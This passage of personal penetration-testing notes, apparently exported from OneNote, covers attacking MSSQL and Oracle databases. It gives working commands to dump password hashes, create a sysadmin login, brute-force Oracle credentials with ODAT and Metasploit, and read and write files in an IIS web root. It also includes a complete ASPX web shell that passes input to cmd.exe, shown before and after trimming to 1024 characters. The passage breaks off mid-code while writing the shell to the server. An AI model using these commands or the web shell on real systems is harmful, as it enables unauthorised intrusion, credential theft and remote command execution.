   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:6.5062in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>EXEC
   sp_linkedservers<br>
      SELECT * FROM sys.servers;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.1402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>List users</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:6.575in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>select sp.name as
   login, sp.type_desc as login_type, sl.password_hash, sp.create_date,
   sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled'
   end as status from sys.server_principals sp left join sys.sql_logins sl on
   sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by
   sp.name;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.1402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Create user with
   sysadmin privs</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:6.5062in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>CREATE LOGIN
   &lt;username&gt; WITH PASSWORD = '&lt;password&gt;'<br>
      sp_addsrvrolemember '&lt;username&gt;', 'sysadmin'</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.1597in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>View password
   hashes</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:6.4868in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SELECT name,
   password_hash FROM master.sys.sql_logins</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.1402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>View permissions</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:6.5062in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SELECT * FROM
   fn_my_permissions(NULL, 'SERVER');</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.1402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:6.5062in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
   </td>
  </tr>
 </table>
 </div>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:11.4881in'>

<div style='direction:ltr;margin-top:0in;margin-left:.2486in;width:3.9902in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>1521 TCP /
Oracle TNS Listener</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.2486in;width:2.102in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Friday,
June 18, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>2:04
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:11.4881in'>

<ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:0in'>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Oracle DB exploit guide</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf</span></li>
  </ul>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>metasploit for Oracle</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>blog.zsec.uk/msforacle/</span></li>
  </ul>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>ODAT</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Requires sqlplus to run
       correctly</span></li>
  </ul>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Generating shell for Oracle</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>1024 character max</span></li>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>aspx for Windows</span></li>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>must all be on one line</span></li>
  </ul>
 </ul>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Methodology:</p>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.4861in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enumerate SIDE
   for Oracle DB</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.9812in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:
    0in'>
    <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>odat sidguesser</span></li>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>auxiliary/scanner/oracle/sid_brute</span></li>
    </ul>
   </ul>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.4861in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Brute force login
   credentials</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:6.0506in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:
    0in'>
    <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>odat passwordguesser</span></li>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
         style='font-family:Calibri;font-size:11.0pt'>auxiliary/scanner/oracle/oracle_login<br>
                  <br>
                  Oracle is case sensitive for passwords.<span
         style='mso-spacerun:yes'>  </span>Make sure user/password list 
is
         lowercase (typically).</span></li>
    </ul>
   </ul>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.5638in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Log into Oracle
   DB</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.9034in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>sqlplus64
   &lt;username&gt;/&lt;password&gt;@&lt;ip address&gt;:&lt;port&gt;/&lt;DB
   Name&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.5833in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Log into Oracle
   DB with sys db admin (sudo for oracle)</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.884in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>sqlplus64
   &lt;username&gt;/&lt;password&gt;@&lt;ip address&gt;:&lt;port&gt;/&lt;DB
   Name&gt; as sysdba</p>
   </td>
  </tr>
 </table>
 </div>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>ODAT Commands:</p>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.5847in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Scan Oracle DB</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:8.5666in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>odat all -s
   &lt;ip address&gt; -d &lt;database&gt; -U &lt;username&gt; -P
   &lt;password&gt;<br>
      <br>
      Add --sysdba flag to authenticate as sysdba (sudo for Oracle)</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.5847in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Authenticate as
   sysdba (sudo for Oracle)</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:8.5666in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>--sysdba</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.5847in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Upload file</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:8.5666in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>odat dbmsadvisor
   -s 10.10.10.82 -d &lt;database&gt; -U &lt;username&gt; -P &lt;password&gt;
   --sysdba --putFile C:\\inetpub\\wwwroot &lt;remote file&gt; &lt;local
   file&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Also try
   dbmsxslprocessor instead of dbmsadvisor</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.5847in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:8.5666in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
   </td>
  </tr>
 </table>
 </div>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Manual Exploitation
 (no ODAT):</p>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Oracle DB Commands:</p>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.3784in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>View privileges</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:4.1354in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>select * from
   session_privs;<br>
      select * from user_role_privs;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.3784in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Read file</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:4.1354in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>declare<br>
      f utl_file.file_type;<br>
      s varchar(400);</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>begin</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>f :=
   utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');<br>
      utl_file.get_line(f,s);<br>
      utl_file.fclose(f);<br>
      dbms_output.put_line(s);<br>
      end;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.3784in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Write file</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:4.2041in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>declare<br>
      f utl_file.file_type;<br>
      s varchar(5000) := '&lt;insert text to write&gt;';<br>
      begin<br>
      f := utl_file.fopen('/inetpub/wwwroot', '&lt;filename&gt;.&lt;type&gt;',
   'W');<br>
      utl_file.put_line(f,s);<br>
      utl_file.fclose(f);<br>
      end;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.3979in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Run last
   procedure</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:4.1159in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>/</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.3784in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>View output</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:4.1354in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>set serveroutput
   ON</p>
   </td>
  </tr>
 </table>
 </div>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Generating shell for Oracle</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>aspx for Windows</span></li>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>must all be on one line</span></li>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>sed -z 's/\n//g'
        &lt;file&gt;</span></li>
   </ul>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>1024 character max</span></li>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>aspx web shell:</span></li>
   </ul>
  </ul>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:.9145in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Before (Over 1024
   characters)</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:10.2368in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'><span
   style='mso-spacerun:yes'> </span>Impor
   Namespace=&quot;System.Diagnostics&quot; %&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;%@ Import
   Namespace=&quot;System.IO&quot; %&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;script
   Language=&quot;c#&quot; runat=&quot;server&quot;&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>void
   Page_Load(object sender, EventArgs e)</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>{</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>}</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>string
   ExcuteCmd(string arg)</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>{</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>ProcessStartInfo
   psi = new ProcessStartInfo();</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>psi.FileName =
   &quot;cmd.exe&quot;;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>psi.Arguments =
   &quot;/c &quot;+arg;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>psi.RedirectStandardOutput
   = true;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>psi.UseShellExecute
   = false;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Process p =
   Process.Start(psi);</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>StreamReader
   stmrdr = p.StandardOutput;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>string s =
   stmrdr.ReadToEnd();</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>stmrdr.Close();</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>return s;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>}</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>void
   cmdExe_Click(object sender, System.EventArgs e)</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>{</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Response.Write(&quot;&lt;pre&gt;&quot;);</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Response.Write(&quot;&lt;/pre&gt;&quot;);</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>}</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;/script&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;HTML&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt;color:#FA0000'>&lt;HEAD&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt;color:#FA0000'>&lt;title&gt;awen
   asp.net webshell&lt;/title&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt;color:#FA0000'>&lt;/HEAD&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;body &gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;form
   id=&quot;cmd&quot; method=&quot;post&quot; runat=&quot;server&quot;&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;asp:TextBox
   id=&quot;txtArg&quot;<span style='color:#FA0000'> style=&quot;Z-INDEX: 101;
   LEFT: 405px; POSITION: absolute; TOP: 20px&quot;</span>
   runat=&quot;server&quot; Width=&quot;250px&quot;&gt;&lt;/asp:TextBox&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;asp:Button
   id=&quot;testing&quot;<span style='color:#FA0000'> style=&quot;Z-INDEX: 102;
   LEFT: 675px; POSITION: absolute; TOP: 18px&quot;</span>
   runat=&quot;server&quot; Text=&quot;excute&quot;
   OnClick=&quot;cmdExe_Click&quot;&gt;&lt;/asp:Button&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;asp:Label
   id=&quot;lblText&quot; <span style='color:#FA0000'>style=&quot;Z-INDEX: 103;
   LEFT: 310px; POSITION: absolute; TOP: 22px&quot;</span>
   runat=&quot;server&quot;&gt;Command:&lt;/asp:Label&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;/form&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;/body&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;/HTML&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt;color:#FA0000'>&lt;!--
   Contributed by Dominic Chell (<a
   href="http://digitalapocalypse.blogspot.com/">http://digitalapocalypse.blogspot.com/</a>)
   --&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt;color:#FA0000'>&lt;!--<span
   style='mso-spacerun:yes'>    </span><a href="http://michaeldaw.
g">http://michaeldaw.org</a><span
   style='mso-spacerun:yes'>   </span>04/2007<span style='mso-spacer
n:yes'> �
   </span>--&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:.9145in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>After (less than
   1024 characters)</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:10.2368in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Import
   Namespace=&quot;System.Diagnostics&quot; %&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;%@ Import
   Namespace=&quot;System.IO&quot; %&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;script
   Language=&quot;c#&quot; runat=&quot;server&quot;&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>void
   Page_Load(object sender, EventArgs e)</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>{</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>}</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>string
   ExcuteCmd(string arg)</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>{</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>ProcessStartInfo
   psi = new ProcessStartInfo();</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>psi.FileName =
   &quot;cmd.exe&quot;;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>psi.Arguments =
   &quot;/c &quot;+arg;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>psi.RedirectStandardOutput
   = true;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>psi.UseShellExecute
   = false;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Process p =
   Process.Start(psi);</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>StreamReader
   stmrdr = p.StandardOutput;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>string s =
   stmrdr.ReadToEnd();</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>stmrdr.Close();</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>return s;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>}</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>void
   cmdExe_Click(object sender, System.EventArgs e)</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>{</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Response.Write(&quot;&lt;pre&gt;&quot;);</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Response.Write(&quot;&lt;/pre&gt;&quot;);</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>}</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;/script&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;HTML&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;body &gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;form
   id=&quot;cmd&quot; method=&quot;post&quot; runat=&quot;server&quot;&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;asp:TextBox
   id=&quot;txtArg&quot; runat=&quot;server&quot;
   Width=&quot;250px&quot;&gt;&lt;/asp:TextBox&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;asp:Button
   id=&quot;testing&quot; runat=&quot;server&quot; Text=&quot;excute&quot;
   OnClick=&quot;cmdExe_Click&quot;&gt;&lt;/asp:Button&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;asp:Label
   id=&quot;lblText&quot;
   runat=&quot;server&quot;&gt;Command:&lt;/asp:Label&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;/form&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;/body&gt;</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&lt;/HTML&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:.8951in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Write shell.aspx</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:10.3125in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>declare<br>
      f utl_file.file_type;<br>
      s varchar(5000) := '&lt;%@ Page Language=&quot;C#&quot;
   Debug=&quot;true&quot; Trace=&quot;false&quot; %&gt;&lt;%@ Import
